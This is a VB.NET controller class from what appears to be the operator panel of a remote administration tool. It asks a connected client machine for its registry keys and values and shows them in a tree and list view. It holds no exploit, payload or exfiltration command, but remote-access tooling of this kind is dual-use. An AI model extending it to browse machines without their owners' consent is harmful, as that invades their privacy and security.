Imports System.Threading
Imports ServerCore

Public Class RegeditController
    Inherits ComponentController

    Enum RegType As Integer
        REG_SZ = 1
        REG_BINARY = 3
        REG_DWORD = 4
        REG_QWORD = 11
        REG_MULTI_SZ = 7
        REG_EXPAND_SZ = 2
    End Enum

    Private user As UserWrapper
    Private cancellationToken As CancellationToken

    Private WithEvents regKeyHolder As TreeView
    Private WithEvents regValueHolder As ListView
    Private WithEvents regBtnKeyRefresh As ToolStripMenuItem

    Public Sub New(user As UserWrapper, cancellationToken As CancellationToken)
        MyBase.New(user.GetComponent(ComponentTypes.regedit))
        Me.user = user
        Me.component = user.GetComponent(ComponentTypes.regedit)
        Me.cancellationToken = cancellationToken
    End Sub

    Public Shared Sub StartupInit()

    End Sub

    Public Overrides Function Init() As Task
        AddHandlers()
        InitializeView()

        viewer.TextBox2.Text = "on"
        viewer.TextBox2.ForeColor = Color.LightGreen

        Return Task.CompletedTask
    End Function

    Public Overrides Function UnInit() As Task
        viewer.TextBox2.Text = "off"
        viewer.TextBox2.ForeColor = Color.FromArgb(214, 69, 38)

        ClearView()
        RemoveHandlers()
        Return Task.CompletedTask
    End Function

    Protected Overrides Sub AddHandlers()
        regKeyHolder = viewer.regKeyHolder
        regValueHolder = viewer.regValueHolder
        regBtnKeyRefresh = viewer.regBtnKeyRefresh
    End Sub
    Protected Overrides Sub RemoveHandlers()
        regKeyHolder = Nothing
        regValueHolder = Nothing
        regBtnKeyRefresh = Nothing
    End Sub


#Region "PacketProcessor"
    Public Overrides Async Function HandlePacket(user As UserWrapper, packet As StructurePacketHeader, token As TokenSecurity) As Task
        Select Case packet.dataType
            Case DataTypes.enum_keys
                Dim keyNameBuffer(255) As Byte

                '' Getting the full path of the string
                Dim regpth As String = packet.arguments
                Dim wantedNode As TreeNode = regKeyHolder.GetNodeByFullPath(regpth)

                If wantedNode Is Nothing Then
                    Throw New Exception("Regedit node with path """ + regpth + """ was not found")
                End If

                '' Disable drawing events for reg control
                regKeyHolder.BeginUpdate()

                '' Trying to receive the entire item collection in a fragmented manner.
                If Not Await component.RecvFragmented(keyNameBuffer, 255,
                        Sub(ByVal lrecvBytes As UInt64)
                            Dim keyName As String = System.Text.Encoding.ASCII.GetString(keyNameBuffer, 0, lrecvBytes)

                            SafeString(keyName)

                            '' Some keys could be returned with 0 length because an error occured while opening them
                            If keyName.Length <> 0 Then
                                '' Insert the new node into the tree view
                                wantedNode.AddTreeNode(keyName)
                            End If

                        End Sub) Then
                    Return
                End If

                '' Expand the tree node
                wantedNode.Expand()

                '' Re-enable drawing events for reg controll
                regKeyHolder.EndUpdate()

            Case DataTypes.enum_values
                Dim data As New StructureRegeditValue

                If Not Await component.RecvStructure(data) Then Return

                '' Empty packet
                If data.valueType = 0 Then
                    EndTransaction()
                    Return
                End If

                '' The client is not allowed to send me a key name larger than 255
                If data.valueName.Length > 255 Then
                    Throw New Exception("Reg key name exceeds the maximum")
                End If
                If data.valueName.Length = 0 Then
                    data.valueName = "(Default)"
                End If

                Dim newEntryList As New ListViewItem(data.valueName, 2)
                newEntryList.SubItems.Add(ConvertRegTypeToString(data.valueType))
                newEntryList.SubItems.Add(ConvertToText(data.valueData, CType(data.valueType, RegType)))

                regValueHolder.Items.Add(newEntryList)
        End Select
    End Function
#End Region



#Region "Model"
    '' MUST NOT be used in events but only in exception-"managed" functions like HandlePacket
    '' Because it throws a cancellation error
    Private Sub EndTransaction()
        component.GetTokenManager().DisableAllTokens()

        ControllerState = CONTROLLER_STATE.PAUSED

        ''Uninitialize component if it's requested
        cancellationToken.ThrowIfCancellationRequested()
    End Sub

    Private Async Sub RegeditKeyHitTestNode(ByVal e As TreeNode)
        If Not ControllerState = CONTROLLER_STATE.PAUSED Then
            Return
        End If
        ControllerState = CONTROLLER_STATE.PROCESSING

        '' Get the node's full path
        If Not (e.IsExpanded Or e.Tag = "visited") Then
            '' Send the command to the client
            If Not Await component.SendHeader(CreateHeader(DataTypes.enum_keys, 0, e.RegeditGetFullPath()), CreateLooseToken(DataTypes.enum_keys)) Then Exit Sub

            '' Set this node as selected
            e.Tag = "visited"
        End If

        '' Remove all items from the view
        regValueHolder.Items.Clear()

        '' No matter the conditions I will always query the values
        If Not Await component.SendHeader(CreateHeader(DataTypes.enum_values, 0, e.RegeditGetFullPath()), CreateLooseToken(DataTypes.enum_values)) Then Exit Sub
    End Sub
#End Region


#Region "View"
    Private Sub InitializeView()
        regKeyHolder.AddTreeNode("HKEY_CLASSES_ROOT")   ' 0
        regKeyHolder.AddTreeNode("HKEY_CURRENT_USER")   ' 1
        regKeyHolder.AddTreeNode("HKEY_LOCAL_MACHINE")  ' 2
        regKeyHolder.AddTreeNode("HKEY_USERS")          ' 3
        regKeyHolder.AddTreeNode("HKEY_CURRENT_CONFIG") ' 4
    End Sub
    Private Sub ClearView()
        regKeyHolder.Nodes.Clear()
        regValueHolder.Items.Clear()
    End Sub
#End Region


#Region "Events"
    Private Sub regKeyHolder_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs) Handles regKeyHolder.NodeMouseClick
        RegeditKeyHitTestNode(e.Node)
    End Sub

    Private Sub regBtnKeyRefresh_Click(sender As Object, e As EventArgs) Handles regBtnKeyRefresh.Click
        regKeyHolder.SelectedNode.Nodes.Clear()

        RegeditKeyHitTestNode(regKeyHolder.SelectedNode)
    End Sub
#End Region

    Private Function ConvertRootKeyToIndex(rootKey As String) As Integer
        Dim index As Integer = 0

        Select Case rootKey
            Case "HKEY_CLASSES_ROOT"
                index = 0
            Case "HKEY_CURRENT_USER"
                index = 1
            Case "HKEY_LOCAL_MACHINE"
                index = 2
            Case "HKEY_USERS"
                index = 3
            Case "HKEY_CURRENT_CONFIG"
                index = 4
        End Select

        Return index
    End Function
    Private Function ConvertRootIndexToKey(index As Integer) As String
        Dim rootKey As String = ""

        Select Case index
            Case 0
                rootKey = "HKEY_CLASSES_ROOT"
            Case 1
                rootKey = "HKEY_CURRENT_USER"
            Case 2
                rootKey = "HKEY_LOCAL_MACHINE"
            Case 3
                rootKey = "HKEY_USERS"
            Case 4
                rootKey = "HKEY_CURRENT_CONFIG"
        End Select

        Return rootKey
    End Function
    Private Function ConvertRegTypeToString(ByVal type As Integer) As String
        Dim str_type As String = "REG_UNKNOWN"

        '' Or use the horrible hack:
        '' [Enum].GetName(GetType(RegType),a)

        Select Case CType(type, RegType)
            Case RegType.REG_SZ
                str_type = "REG_SZ"
            Case RegType.REG_BINARY
                str_type = "REG_BINARY"
            Case RegType.REG_DWORD
                str_type = "REG_DWORD"
            Case RegType.REG_QWORD
                str_type = "REG_QWORD"
            Case RegType.REG_MULTI_SZ
                str_type = "REG_MULTI_SZ"
            Case RegType.REG_EXPAND_SZ
                str_type = "REG_EXPAND_SZ"
        End Select

        Return str_type
    End Function
    Private Function ConvertToText(data As Byte(), type As RegType) As String
        Dim res As String = "INCORRECT"

        Select Case type
            Case RegType.REG_SZ
                res = System.Text.Encoding.ASCII.GetString(data, 0, data.Length)

            Case RegType.REG_BINARY
                res = BitConverter.ToString(data, 0)

            Case RegType.REG_DWORD
                If data.Length = 4 Then
                    res = BitConverter.ToInt32(data, 0)
                End If

            Case RegType.REG_QWORD
                If data.Length = 8 Then
                    res = BitConverter.ToInt64(data, 0)
                End If

            Case RegType.REG_MULTI_SZ
                res = System.Text.Encoding.ASCII.GetString(data, 0, data.Length).Replace(vbNullChar, "+")

            Case RegType.REG_EXPAND_SZ
                res = System.Text.Encoding.ASCII.GetString(data, 0, data.Length)
        End Select

        SafeString(res)
        Return res
    End Function
End Class
